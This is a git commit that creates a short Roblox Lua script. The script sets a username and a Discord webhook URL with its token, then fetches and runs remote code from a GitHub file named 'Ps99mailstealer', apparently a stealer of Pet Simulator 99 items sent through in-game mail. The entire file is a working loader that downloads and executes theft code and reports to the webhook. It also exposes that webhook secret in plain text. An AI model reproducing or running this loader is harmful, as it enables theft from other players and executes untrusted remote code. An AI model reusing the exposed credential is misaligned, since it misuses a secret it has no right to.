4940f44fe4bd88800d079a66f5b431ede97d9a35
LisiyNefor <154824990+LisiyNefor@users.noreply.github.com>
2023-12-25 23:38:11 +0700

    Create scrpt.lua

---
+++ scrpt.lua
@@ -0,0 +1,4 @@
+UserName = "Al0haDancce"
+WebHook = "https://discord.com/api/webhooks/1188880015622934528/0iOOYwCks88hS3pVY-p8GI8JiiZN6TM-Tn_-PL81Y3_b8RW8Ba67xuMfAtShDuwMZRWL"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kdm063/DuckX./main/Ps99mailstealer", true))()
